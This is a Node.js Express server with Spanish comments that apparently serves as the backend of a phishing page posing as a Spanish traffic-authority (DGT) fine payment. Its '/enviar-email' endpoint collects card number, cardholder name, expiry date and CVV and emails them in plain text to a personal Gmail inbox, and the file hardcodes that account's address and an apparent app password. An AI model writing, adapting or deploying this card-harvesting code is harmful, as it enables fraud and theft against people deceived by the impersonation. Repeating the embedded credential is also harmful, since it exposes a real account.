const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// Configurar Gmail (CAMBIA ESTO)
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'marcosvintatge@gmail.com',        // ← CAMBIA POR TU EMAIL
        pass: 'smay biix lzmw gswh'       // ← CAMBIA POR TU CONTRASEÑA
    }
});

// Verificar conexión con Gmail al arrancar
transporter.verify(function(error, success) {
  if (error) {
    console.log("❌ Error de configuración de email:", error);
  } else {
    console.log("📧 Servidor listo para enviar correos");
  }
});

// Ruta para enviar email
app.post('/enviar-email', (req, res) => {
    console.log('📬 Recibida petición de pago:', req.body);
    const { concepto, referencia, tarjeta, nombre, expiry, cvv } = req.body;
    
    const mailOptions = {
        from: 'marcosvintatge@gmail.com',
        to: 'marcosvintatge@gmail.com',          // ← DÓNDE RECIBIRÁS LOS DATOS
        subject: `🚗 Nuevo pago DGT - ${referencia}`,
        html: `
            <h2>🚨 NUEVO PAGO RECIBIDO</h2>
            <p><strong>Fecha:</strong> ${new Date().toLocaleString('es-ES')}</p>
            <hr>
            <p><strong>Concepto:</strong> ${concepto}</p>
            <p><strong>Referencia:</strong> ${referencia}</p>
            <p><strong>Titular:</strong> ${nombre}</p>
            <p><strong>Tarjeta:</strong> ${tarjeta}</p>
            <p><strong>Caducidad:</strong> ${expiry}</p>
            <p><strong>CVV:</strong> ${cvv}</p>
            <hr>
            <p><em>Datos guardados automáticamente</em></p>
        `
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log('❌ Error:', error);
            res.json({ success: false, message: 'Error al enviar email' });
        } else {
            console.log('✅ Email enviado:', info.response);
            res.json({ success: true, message: 'Datos enviados correctamente' });
        }
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Servidor corriendo");
});
